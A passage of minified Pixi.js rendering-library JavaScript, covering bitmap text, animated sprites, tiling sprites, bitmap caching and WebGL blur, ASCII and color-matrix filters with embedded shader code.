on."),i.AbstractFilter}},FXAAFilter:{get:function(){return console.warn("filters.FXAAFilter is an undocumented alias, please use FXAAFilter from now on."),i.FXAAFilter}},SpriteMaskFilter:{get:function(){return console.warn("filters.SpriteMaskFilter is an undocumented alias, please use SpriteMaskFilter from now on."),i.SpriteMaskFilter}}}),i.utils.uuid=function(){return console.warn("utils.uuid() is deprecated, please use utils.uid() from now on."),i.utils.uid()}},{"./core":29,"./extras":85,"./filters":102,"./mesh":126}],79:[function(t,e,r){function i(t,e){n.Container.call(this),e=e||{},this.textWidth=0,this.textHeight=0,this._glyphs=[],this._font={tint:void 0!==e.tint?e.tint:16777215,align:e.align||"left",name:null,size:0},this.font=e.font,this._text=t,this.maxWidth=0,this.dirty=!1,this.updateText()}var n=t("../core");i.prototype=Object.create(n.Container.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{tint:{get:function(){return this._font.tint},set:function(t){
this._font.tint="number"==typeof t&&t>=0?t:16777215,this.dirty=!0}},align:{get:function(){return this._font.align},set:function(t){this._font.align=t||"left",this.dirty=!0}},font:{get:function(){return this._font},set:function(t){t&&("string"==typeof t?(t=t.split(" "),this._font.name=1===t.length?t[0]:t.slice(1).join(" "),this._font.size=t.length>=2?parseInt(t[0],10):i.fonts[this._font.name].size):(this._font.name=t.name,this._font.size="number"==typeof t.size?t.size:parseInt(t.size,10)),this.dirty=!0)}},text:{get:function(){return this._text},set:function(t){t=t.toString()||" ",this._text!==t&&(this._text=t,this.dirty=!0)}}}),i.prototype.updateText=function(){for(var t=i.fonts[this._font.name],e=new n.Point,r=null,o=[],s=0,a=0,h=[],l=0,u=this._font.size/t.size,c=-1,p=0;p<this.text.length;p++){var d=this.text.charCodeAt(p);if(c=/(\s)/.test(this.text.charAt(p))?p:c,/(?:\r\n|\r|\n)/.test(this.text.charAt(p)))h.push(s),a=Math.max(a,s),l++,e.x=0,e.y+=t.lineHeight,r=null;else if(-1!==c&&this.maxWidth>0&&e.x*u>this.maxWidth)o.splice(c,p-c),p=c,c=-1,h.push(s),a=Math.max(a,s),l++,e.x=0,e.y+=t.lineHeight,r=null;else{var f=t.chars[d];f&&(r&&f.kerning[r]&&(e.x+=f.kerning[r]),o.push({texture:f.texture,line:l,charCode:d,position:new n.Point(e.x+f.xOffset,e.y+f.yOffset)}),s=e.x+(f.texture.width+f.xOffset),e.x+=f.xAdvance,r=d)}}h.push(s),a=Math.max(a,s);var v=[];for(p=0;l>=p;p++){var g=0;"right"===this._font.align?g=a-h[p]:"center"===this._font.align&&(g=(a-h[p])/2),v.push(g)}var m=o.length,y=this.tint;for(p=0;m>p;p++){var x=this._glyphs[p];x?x.texture=o[p].texture:(x=new n.Sprite(o[p].texture),this._glyphs.push(x)),x.position.x=(o[p].position.x+v[o[p].line])*u,x.position.y=o[p].position.y*u,x.scale.x=x.scale.y=u,x.tint=y,x.parent||this.addChild(x)}for(p=m;p<this._glyphs.length;++p)this.removeChild(this._glyphs[p]);this.textWidth=a*u,this.textHeight=(e.y+t.lineHeight)*u},i.prototype.updateTransform=function(){this.validate(),this.containerUpdateTransform()},i.prototype.getLocalBounds=function(){return this.validate(),n.Container.prototype.getLocalBounds.call(this)},i.prototype.validate=function(){this.dirty&&(this.updateText(),this.dirty=!1)},i.fonts={}},{"../core":29}],80:[function(t,e,r){function i(t){n.Sprite.call(this,t[0]),this._textures=t,this.animationSpeed=1,this.loop=!0,this.onComplete=null,this._currentTime=0,this.playing=!1}var n=t("../core");i.prototype=Object.create(n.Sprite.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{totalFrames:{get:function(){return this._textures.length}},textures:{get:function(){return this._textures},set:function(t){this._textures=t,this.texture=this._textures[Math.floor(this._currentTime)%this._textures.length]}},currentFrame:{get:function(){return Math.floor(this._currentTime)%this._textures.length}}}),i.prototype.stop=function(){this.playing&&(this.playing=!1,n.ticker.shared.remove(this.update,this))},i.prototype.play=function(){this.playing||(this.playing=!0,n.ticker.shared.add(this.update,this))},i.prototype.gotoAndStop=function(t){this.stop(),this._currentTime=t;var e=Math.floor(this._currentTime);this._texture=this._textures[e%this._textures.length]},i.prototype.gotoAndPlay=function(t){this._currentTime=t,this.play()},i.prototype.update=function(t){this._currentTime+=this.animationSpeed*t;var e=Math.floor(this._currentTime);0>e?this.loop?this._texture=this._textures[this._textures.length-1+e%this._textures.length]:(this.gotoAndStop(0),this.onComplete&&this.onComplete()):this.loop||e<this._textures.length?this._texture=this._textures[e%this._textures.length]:e>=this._textures.length&&(this.gotoAndStop(this.textures.length-1),this.onComplete&&this.onComplete())},i.prototype.destroy=function(){this.stop(),n.Sprite.prototype.destroy.call(this)},i.fromFrames=function(t){for(var e=[],r=0;r<t.length;++r)e.push(new n.Texture.fromFrame(t[r]));return new i(e)},i.fromImages=function(t){for(var e=[],r=0;r<t.length;++r)e.push(new n.Texture.fromImage(t[r]));return new i(e)}},{"../core":29}],81:[function(t,e,r){function i(t,e,r){n.Sprite.call(this,t),this.tileScale=new n.Point(1,1),this.tilePosition=new n.Point(0,0),this._width=e||100,this._height=r||100,this._uvs=new n.TextureUvs,this._canvasPattern=null,this.shader=new n.AbstractFilter(["precision lowp float;","attribute vec2 aVertexPosition;","attribute vec2 aTextureCoord;","attribute vec4 aColor;","uniform mat3 projectionMatrix;","uniform vec4 uFrame;","uniform vec4 uTransform;","varying vec2 vTextureCoord;","varying vec4 vColor;","void main(void){","   gl_Position = vec4((projectionMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);","   vec2 coord = aTextureCoord;","   coord -= uTransform.xy;","   coord /= uTransform.zw;","   vTextureCoord = coord;","   vColor = vec4(aColor.rgb * aColor.a, aColor.a);","}"].join("\n"),["precision lowp float;","varying vec2 vTextureCoord;","varying vec4 vColor;","uniform sampler2D uSampler;","uniform vec4 uFrame;","uniform vec2 uPixelSize;","void main(void){","   vec2 coord = mod(vTextureCoord, uFrame.zw);","   coord = clamp(coord, uPixelSize, uFrame.zw - uPixelSize);","   coord += uFrame.xy;","   gl_FragColor =  texture2D(uSampler, coord) * vColor ;","}"].join("\n"),{uFrame:{type:"4fv",value:[0,0,1,1]},uTransform:{type:"4fv",value:[0,0,1,1]},uPixelSize:{type:"2fv",value:[1,1]}})}var n=t("../core"),o=new n.Point;i.prototype=Object.create(n.Sprite.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{width:{get:function(){return this._width},set:function(t){this._width=t}},height:{get:function(){return this._height},set:function(t){this._height=t}}}),i.prototype._onTextureUpdate=function(){},i.prototype._renderWebGL=function(t){var e=this._texture;if(e&&e._uvs){var r=e._uvs,i=e._frame.width,n=e._frame.height,o=e.baseTexture.width,s=e.baseTexture.height;e._uvs=this._uvs,e._frame.width=this.width,e._frame.height=this.height,this.shader.uniforms.uPixelSize.value[0]=1/o,this.shader.uniforms.uPixelSize.value[1]=1/s,this.shader.uniforms.uFrame.value[0]=r.x0,this.shader.uniforms.uFrame.value[1]=r.y0,this.shader.uniforms.uFrame.value[2]=r.x1-r.x0,this.shader.uniforms.uFrame.value[3]=r.y2-r.y0,this.shader.uniforms.uTransform.value[0]=this.tilePosition.x%(i*this.tileScale.x)/this._width,this.shader.uniforms.uTransform.value[1]=this.tilePosition.y%(n*this.tileScale.y)/this._height,this.shader.uniforms.uTransform.value[2]=o/this._width*this.tileScale.x,this.shader.uniforms.uTransform.value[3]=s/this._height*this.tileScale.y,t.setObjectRenderer(t.plugins.sprite),t.plugins.sprite.render(this),e._uvs=r,e._frame.width=i,e._frame.height=n}},i.prototype._renderCanvas=function(t){var e=this._texture;if(e.baseTexture.hasLoaded){var r=t.context,i=this.worldTransform,o=t.resolution,s=e.baseTexture,a=this.tilePosition.x%(e._frame.width*this.tileScale.x),h=this.tilePosition.y%(e._frame.height*this.tileScale.y);if(!this._canvasPattern){var l=new n.CanvasBuffer(e._frame.width,e._frame.height);l.context.drawImage(s.source,-e._frame.x,-e._frame.y),this._canvasPattern=l.context.createPattern(l.canvas,"repeat")}r.globalAlpha=this.worldAlpha,r.setTransform(i.a*o,i.b*o,i.c*o,i.d*o,i.tx*o,i.ty*o),r.scale(this.tileScale.x,this.tileScale.y),r.translate(a+this.anchor.x*-this._width,h+this.anchor.y*-this._height),this.blendMode!==t.currentBlendMode&&(t.currentBlendMode=this.blendMode,r.globalCompositeOperation=t.blendModes[t.currentBlendMode]),r.fillStyle=this._canvasPattern,r.fillRect(-a,-h,this._width/this.tileScale.x,this._height/this.tileScale.y)}},i.prototype.getBounds=function(){var t,e,r,i,n=this._width,o=this._height,s=n*(1-this.anchor.x),a=n*-this.anchor.x,h=o*(1-this.anchor.y),l=o*-this.anchor.y,u=this.worldTransform,c=u.a,p=u.b,d=u.c,f=u.d,v=u.tx,g=u.ty,m=c*a+d*l+v,y=f*l+p*a+g,x=c*s+d*l+v,b=f*l+p*s+g,_=c*s+d*h+v,T=f*h+p*s+g,E=c*a+d*h+v,S=f*h+p*a+g;t=m,t=t>x?x:t,t=t>_?_:t,t=t>E?E:t,r=y,r=r>b?b:r,r=r>T?T:r,r=r>S?S:r,e=m,e=x>e?x:e,e=_>e?_:e,e=E>e?E:e,i=y,i=b>i?b:i,i=T>i?T:i,i=S>i?S:i;var A=this._bounds;return A.x=t,A.width=e-t,A.y=r,A.height=i-r,this._currentBounds=A,A},i.prototype.containsPoint=function(t){this.worldTransform.applyInverse(t,o);var e,r=this._width,i=this._height,n=-r*this.anchor.x;return o.x>n&&o.x<n+r&&(e=-i*this.anchor.y,o.y>e&&o.y<e+i)?!0:!1},i.prototype.destroy=function(){n.Sprite.prototype.destroy.call(this),this.tileScale=null,this._tileScaleOffset=null,this.tilePosition=null,this._uvs=null},i.fromFrame=function(t,e,r){var o=n.utils.TextureCache[t];if(!o)throw new Error('The frameId "'+t+'" does not exist in the texture cache '+this);return new i(o,e,r)},i.fromImage=function(t,e,r,o,s){return new i(n.Texture.fromImage(t,o,s),e,r)}},{"../core":29}],82:[function(t,e,r){var i=t("../core"),n=i.DisplayObject,o=new i.Matrix;n.prototype._cacheAsBitmap=!1,n.prototype._originalRenderWebGL=null,n.prototype._originalRenderCanvas=null,n.prototype._originalUpdateTransform=null,n.prototype._originalHitTest=null,n.prototype._originalDestroy=null,n.prototype._cachedSprite=null,Object.defineProperties(n.prototype,{cacheAsBitmap:{get:function(){return this._cacheAsBitmap},set:function(t){this._cacheAsBitmap!==t&&(this._cacheAsBitmap=t,t?(this._originalRenderWebGL=this.renderWebGL,this._originalRenderCanvas=this.renderCanvas,this._originalUpdateTransform=this.updateTransform,this._originalGetBounds=this.getBounds,this._originalDestroy=this.destroy,this._originalContainsPoint=this.containsPoint,this.renderWebGL=this._renderCachedWebGL,this.renderCanvas=this._renderCachedCanvas,this.destroy=this._cacheAsBitmapDestroy):(this._cachedSprite&&this._destroyCachedDisplayObject(),this.renderWebGL=this._originalRenderWebGL,this.renderCanvas=this._originalRenderCanvas,this.getBounds=this._originalGetBounds,this.destroy=this._originalDestroy,this.updateTransform=this._originalUpdateTransform,this.containsPoint=this._originalContainsPoint))}}}),n.prototype._renderCachedWebGL=function(t){!this.visible||this.worldAlpha<=0||!this.renderable||(this._initCachedDisplayObject(t),this._cachedSprite.worldAlpha=this.worldAlpha,t.setObjectRenderer(t.plugins.sprite),t.plugins.sprite.render(this._cachedSprite))},n.prototype._initCachedDisplayObject=function(t){if(!this._cachedSprite){t.currentRenderer.flush();var e=this.getLocalBounds().clone();if(this._filters){var r=this._filters[0].padding;e.x-=r,e.y-=r,e.width+=2*r,e.height+=2*r}var n=t.currentRenderTarget,s=t.filterManager.filterStack,a=new i.RenderTexture(t,0|e.width,0|e.height),h=o;h.tx=-e.x,h.ty=-e.y,this.renderWebGL=this._originalRenderWebGL,a.render(this,h,!0,!0),t.setRenderTarget(n),t.filterManager.filterStack=s,this.renderWebGL=this._renderCachedWebGL,this.updateTransform=this.displayObjectUpdateTransform,this.getBounds=this._getCachedBounds,this._cachedSprite=new i.Sprite(a),this._cachedSprite.worldTransform=this.worldTransform,this._cachedSprite.anchor.x=-(e.x/e.width),this._cachedSprite.anchor.y=-(e.y/e.height),this.updateTransform(),this.containsPoint=this._cachedSprite.containsPoint.bind(this._cachedSprite)}},n.prototype._renderCachedCanvas=function(t){!this.visible||this.worldAlpha<=0||!this.renderable||(this._initCachedDisplayObjectCanvas(t),this._cachedSprite.worldAlpha=this.worldAlpha,this._cachedSprite.renderCanvas(t))},n.prototype._initCachedDisplayObjectCanvas=function(t){if(!this._cachedSprite){var e=this.getLocalBounds(),r=t.context,n=new i.RenderTexture(t,0|e.width,0|e.height),s=o;s.tx=-e.x,s.ty=-e.y,this.renderCanvas=this._originalRenderCanvas,n.render(this,s,!0),t.context=r,this.renderCanvas=this._renderCachedCanvas,this.updateTransform=this.displayObjectUpdateTransform,this.getBounds=this._getCachedBounds,this._cachedSprite=new i.Sprite(n),this._cachedSprite.worldTransform=this.worldTransform,this._cachedSprite.anchor.x=-(e.x/e.width),this._cachedSprite.anchor.y=-(e.y/e.height),this.updateTransform(),this.containsPoint=this._cachedSprite.containsPoint.bind(this._cachedSprite)}},n.prototype._getCachedBounds=function(){return this._cachedSprite._currentBounds=null,this._cachedSprite.getBounds()},n.prototype._destroyCachedDisplayObject=function(){this._cachedSprite._texture.destroy(),this._cachedSprite=null},n.prototype._cacheAsBitmapDestroy=function(){this.cacheAsBitmap=!1,this._originalDestroy()}},{"../core":29}],83:[function(t,e,r){var i=t("../core");i.DisplayObject.prototype.name=null,i.Container.prototype.getChildByName=function(t){for(var e=0;e<this.children.length;e++)if(this.children[e].name===t)return this.children[e];return null}},{"../core":29}],84:[function(t,e,r){var i=t("../core");i.DisplayObject.prototype.getGlobalPosition=function(t){return t=t||new i.Point,this.parent?(this.displayObjectUpdateTransform(),t.x=this.worldTransform.tx,t.y=this.worldTransform.ty):(t.x=this.position.x,t.y=this.position.y),t}},{"../core":29}],85:[function(t,e,r){t("./cacheAsBitmap"),t("./getChildByName"),t("./getGlobalPosition"),e.exports={MovieClip:t("./MovieClip"),TilingSprite:t("./TilingSprite"),BitmapText:t("./BitmapText")}},{"./BitmapText":79,"./MovieClip":80,"./TilingSprite":81,"./cacheAsBitmap":82,"./getChildByName":83,"./getGlobalPosition":84}],86:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nuniform vec4 dimensions;\nuniform float pixelSize;\nuniform sampler2D uSampler;\n\nfloat character(float n, vec2 p)\n{\n    p = floor(p*vec2(4.0, -4.0) + 2.5);\n    if (clamp(p.x, 0.0, 4.0) == p.x && clamp(p.y, 0.0, 4.0) == p.y)\n    {\n        if (int(mod(n/exp2(p.x + 5.0*p.y), 2.0)) == 1) return 1.0;\n    }\n    return 0.0;\n}\n\nvoid main()\n{\n    vec2 uv = gl_FragCoord.xy;\n\n    vec3 col = texture2D(uSampler, floor( uv / pixelSize ) * pixelSize / dimensions.xy).rgb;\n\n    float gray = (col.r + col.g + col.b) / 3.0;\n\n    float n =  65536.0;             // .\n    if (gray > 0.2) n = 65600.0;    // :\n    if (gray > 0.3) n = 332772.0;   // *\n    if (gray > 0.4) n = 15255086.0; // o\n    if (gray > 0.5) n = 23385164.0; // &\n    if (gray > 0.6) n = 15252014.0; // 8\n    if (gray > 0.7) n = 13199452.0; // @\n    if (gray > 0.8) n = 11512810.0; // #\n\n    vec2 p = mod( uv / ( pixelSize * 0.5 ), 2.0) - vec2(1.0);\n    col = col * character(n, p);\n\n    gl_FragColor = vec4(col, 1.0);\n}\n",{dimensions:{type:"4fv",value:new Float32Array([0,0,0,0])},pixelSize:{type:"1f",value:8}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{size:{get:function(){return this.uniforms.pixelSize.value},set:function(t){this.uniforms.pixelSize.value=t}}})},{"../../core":29}],87:[function(t,e,r){function i(){n.AbstractFilter.call(this),this.blurXFilter=new o,this.blurYFilter=new s,this.defaultFilter=new n.AbstractFilter}var n=t("../../core"),o=t("../blur/BlurXFilter"),s=t("../blur/BlurYFilter");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r){var i=t.filterManager.getRenderTarget(!0);this.defaultFilter.applyFilter(t,e,r),this.blurXFilter.applyFilter(t,e,i),t.blendModeManager.setBlendMode(n.BLEND_MODES.SCREEN),this.blurYFilter.applyFilter(t,i,r),t.blendModeManager.setBlendMode(n.BLEND_MODES.NORMAL),t.filterManager.returnRenderTarget(i)},Object.defineProperties(i.prototype,{blur:{get:function(){return this.blurXFilter.blur},set:function(t){this.blurXFilter.blur=this.blurYFilter.blur=t}},blurX:{get:function(){return this.blurXFilter.blur},set:function(t){this.blurXFilter.blur=t}},blurY:{get:function(){return this.blurYFilter.blur},set:function(t){this.blurYFilter.blur=t}}})},{"../../core":29,"../blur/BlurXFilter":90,"../blur/BlurYFilter":91}],88:[function(t,e,r){function i(t,e){n.AbstractFilter.call(this,"attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec4 aColor;\n\nuniform float strength;\nuniform float dirX;\nuniform float dirY;\nuniform mat3 projectionMatrix;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nvarying vec2 vBlurTexCoords[3];\n\nvoid main(void)\n{\n    gl_Position = vec4((projectionMatrix * vec3((aVertexPosition), 1.0)).xy, 0.0, 1.0);\n    vTextureCoord = aTextureCoord;\n\n    vBlurTexCoords[0] = aTextureCoord + vec2( (0.004 * strength) * dirX, (0.004 * strength) * dirY );\n    vBlurTexCoords[1] = aTextureCoord + vec2( (0.008 * strength) * dirX, (0.008 * strength) * dirY );\n    vBlurTexCoords[2] = aTextureCoord + vec2( (0.012 * strength) * dirX, (0.012 * strength) * dirY );\n\n    vColor = vec4(aColor.rgb * aColor.a, aColor.a);\n}\n","precision lowp float;\n\nvarying vec2 vTextureCoord;\nvarying vec2 vBlurTexCoords[3];\nvarying vec4 vColor;\n\nuniform sampler2D uSampler;\n\nvoid main(void)\n{\n    gl_FragColor = vec4(0.0);\n\n    gl_FragColor += texture2D(uSampler, vTextureCoord     ) * 0.3989422804014327;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 0]) * 0.2419707245191454;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 1]) * 0.05399096651318985;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 2]) * 0.004431848411938341;\n}\n",{strength:{type:"1f",value:1},dirX:{type:"1f",value:t||0},dirY:{type:"1f",value:e||0}}),this.defaultFilter=new n.AbstractFilter,this.passes=1,this.dirX=t||0,this.dirY=e||0,this.strength=4}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r,i){var n=this.getShader(t);if(this.uniforms.strength.value=this.strength/4/this.passes*(e.frame.width/e.size.width),1===this.passes)t.filterManager.applyFilter(n,e,r,i);else{var o=t.filterManager.getRenderTarget(!0);t.filterManager.applyFilter(n,e,o,i);for(var s=0;s<this.passes-2;s++)t.filterManager.applyFilter(n,o,o,i);t.filterManager.applyFilter(n,o,r,i),t.filterManager.returnRenderTarget(o)}},Object.defineProperties(i.prototype,{blur:{get:function(){return this.strength},set:function(t){this.padding=.5*t,this.strength=t}},dirX:{get:function(){return this.dirX},set:function(t){this.uniforms.dirX.value=t}},dirY:{get:function(){return this.dirY},set:function(t){this.uniforms.dirY.value=t}}})},{"../../core":29}],89:[function(t,e,r){function i(){n.AbstractFilter.call(this),this.blurXFilter=new o,this.blurYFilter=new s}var n=t("../../core"),o=t("./BlurXFilter"),s=t("./BlurYFilter");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r){var i=t.filterManager.getRenderTarget(!0);this.blurXFilter.applyFilter(t,e,i),this.blurYFilter.applyFilter(t,i,r),t.filterManager.returnRenderTarget(i)},Object.defineProperties(i.prototype,{blur:{get:function(){return this.blurXFilter.blur},set:function(t){this.padding=.5*Math.abs(t),this.blurXFilter.blur=this.blurYFilter.blur=t}},passes:{get:function(){return this.blurXFilter.passes},set:function(t){this.blurXFilter.passes=this.blurYFilter.passes=t}},blurX:{get:function(){return this.blurXFilter.blur},set:function(t){this.blurXFilter.blur=t}},blurY:{get:function(){return this.blurYFilter.blur},set:function(t){this.blurYFilter.blur=t}}})},{"../../core":29,"./BlurXFilter":90,"./BlurYFilter":91}],90:[function(t,e,r){function i(){n.AbstractFilter.call(this,"attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec4 aColor;\n\nuniform float strength;\nuniform mat3 projectionMatrix;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nvarying vec2 vBlurTexCoords[6];\n\nvoid main(void)\n{\n    gl_Position = vec4((projectionMatrix * vec3((aVertexPosition), 1.0)).xy, 0.0, 1.0);\n    vTextureCoord = aTextureCoord;\n\n    vBlurTexCoords[ 0] = aTextureCoord + vec2(-0.012 * strength, 0.0);\n    vBlurTexCoords[ 1] = aTextureCoord + vec2(-0.008 * strength, 0.0);\n    vBlurTexCoords[ 2] = aTextureCoord + vec2(-0.004 * strength, 0.0);\n    vBlurTexCoords[ 3] = aTextureCoord + vec2( 0.004 * strength, 0.0);\n    vBlurTexCoords[ 4] = aTextureCoord + vec2( 0.008 * strength, 0.0);\n    vBlurTexCoords[ 5] = aTextureCoord + vec2( 0.012 * strength, 0.0);\n\n    vColor = vec4(aColor.rgb * aColor.a, aColor.a);\n}\n","precision lowp float;\n\nvarying vec2 vTextureCoord;\nvarying vec2 vBlurTexCoords[6];\nvarying vec4 vColor;\n\nuniform sampler2D uSampler;\n\nvoid main(void)\n{\n    gl_FragColor = vec4(0.0);\n\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 0])*0.004431848411938341;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 1])*0.05399096651318985;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 2])*0.2419707245191454;\n    gl_FragColor += texture2D(uSampler, vTextureCoord     )*0.3989422804014327;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 3])*0.2419707245191454;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 4])*0.05399096651318985;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 5])*0.004431848411938341;\n}\n",{strength:{type:"1f",value:1}}),this.passes=1,this.strength=4}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r,i){var n=this.getShader(t);if(this.uniforms.strength.value=this.strength/4/this.passes*(e.frame.width/e.size.width),1===this.passes)t.filterManager.applyFilter(n,e,r,i);else{for(var o=t.filterManager.getRenderTarget(!0),s=e,a=o,h=0;h<this.passes-1;h++){t.filterManager.applyFilter(n,s,a,!0);var l=a;a=s,s=l}t.filterManager.applyFilter(n,s,r,i),t.filterManager.returnRenderTarget(o)}},Object.defineProperties(i.prototype,{blur:{get:function(){return this.strength},set:function(t){this.padding=.5*Math.abs(t),this.strength=t}}})},{"../../core":29}],91:[function(t,e,r){function i(){n.AbstractFilter.call(this,"attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec4 aColor;\n\nuniform float strength;\nuniform mat3 projectionMatrix;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nvarying vec2 vBlurTexCoords[6];\n\nvoid main(void)\n{\n    gl_Position = vec4((projectionMatrix * vec3((aVertexPosition), 1.0)).xy, 0.0, 1.0);\n    vTextureCoord = aTextureCoord;\n\n    vBlurTexCoords[ 0] = aTextureCoord + vec2(0.0, -0.012 * strength);\n    vBlurTexCoords[ 1] = aTextureCoord + vec2(0.0, -0.008 * strength);\n    vBlurTexCoords[ 2] = aTextureCoord + vec2(0.0, -0.004 * strength);\n    vBlurTexCoords[ 3] = aTextureCoord + vec2(0.0,  0.004 * strength);\n    vBlurTexCoords[ 4] = aTextureCoord + vec2(0.0,  0.008 * strength);\n    vBlurTexCoords[ 5] = aTextureCoord + vec2(0.0,  0.012 * strength);\n\n   vColor = vec4(aColor.rgb * aColor.a, aColor.a);\n}\n","precision lowp float;\n\nvarying vec2 vTextureCoord;\nvarying vec2 vBlurTexCoords[6];\nvarying vec4 vColor;\n\nuniform sampler2D uSampler;\n\nvoid main(void)\n{\n    gl_FragColor = vec4(0.0);\n\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 0])*0.004431848411938341;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 1])*0.05399096651318985;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 2])*0.2419707245191454;\n    gl_FragColor += texture2D(uSampler, vTextureCoord     )*0.3989422804014327;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 3])*0.2419707245191454;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 4])*0.05399096651318985;\n    gl_FragColor += texture2D(uSampler, vBlurTexCoords[ 5])*0.004431848411938341;\n}\n",{strength:{type:"1f",value:1}}),this.passes=1,this.strength=4}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r,i){var n=this.getShader(t);if(this.uniforms.strength.value=Math.abs(this.strength)/4/this.passes*(e.frame.height/e.size.height),1===this.passes)t.filterManager.applyFilter(n,e,r,i);else{for(var o=t.filterManager.getRenderTarget(!0),s=e,a=o,h=0;h<this.passes-1;h++){t.filterManager.applyFilter(n,s,a,!0);var l=a;a=s,s=l}t.filterManager.applyFilter(n,s,r,i),t.filterManager.returnRenderTarget(o)}},Object.defineProperties(i.prototype,{blur:{get:function(){return this.strength},set:function(t){this.padding=.5*Math.abs(t),this.strength=t}}})},{"../../core":29}],92:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\nuniform vec2 delta;\n\nfloat random(vec3 scale, float seed)\n{\n    return fract(sin(dot(gl_FragCoord.xyz + seed, scale)) * 43758.5453 + seed);\n}\n\nvoid main(void)\n{\n    vec4 color = vec4(0.0);\n    float total = 0.0;\n\n    float offset = random(vec3(12.9898, 78.233, 151.7182), 0.0);\n\n    for (float t = -30.0; t <= 30.0; t++)\n    {\n        float percent = (t + offset - 0.5) / 30.0;\n        float weight = 1.0 - abs(percent);\n        vec4 sample = texture2D(uSampler, vTextureCoord + delta * percent);\n        sample.rgb *= sample.a;\n        color += sample * weight;\n        total += weight;\n    }\n\n    gl_FragColor = color / total;\n    gl_FragColor.rgb /= gl_FragColor.a + 0.00001;\n}\n",{delta:{type:"v2",value:{x:.1,y:0}}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i},{"../../core":29}],93:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\nuniform sampler2D uSampler;\nuniform float m[25];\n\nvoid main(void)\n{\n\n    vec4 c = texture2D(uSampler, vTextureCoord);\n\n    gl_FragColor.r = (m[0] * c.r);\n        gl_FragColor.r += (m[1] * c.g);\n        gl_FragColor.r += (m[2] * c.b);\n        gl_FragColor.r += (m[3] * c.a);\n        gl_FragColor.r += m[4];\n\n    gl_FragColor.g = (m[5] * c.r);\n        gl_FragColor.g += (m[6] * c.g);\n        gl_FragColor.g += (m[7] * c.b);\n        gl_FragColor.g += (m[8] * c.a);\n        gl_FragColor.g += m[9];\n\n     gl_FragColor.b = (m[10] * c.r);\n        gl_FragColor.b += (m[11] * c.g);\n        gl_FragColor.b += (m[12] * c.b);\n        gl_FragColor.b += (m[13] * c.a);\n        gl_FragColor.b += m[14];\n\n     gl_FragColor.a = (m[15] * c.r);\n        gl_FragColor.a += (m[16] * c.g);\n        gl_FragColor.a += (m[17] * c.b);\n        gl_FragColor.a += (m[18] * c.a);\n        gl_FragColor.a += m[19];\n\n}\n",{m:{type:"1fv",value:[1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0]}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype._loadMatrix=function(t,e){e=!!e;var r=t;e&&(this._multiply(r,this.uniforms.m.value,t),r=this._colorMatrix(r)),this.uniforms.m.value=r},i.prototype._multiply=function(t,e,r){return 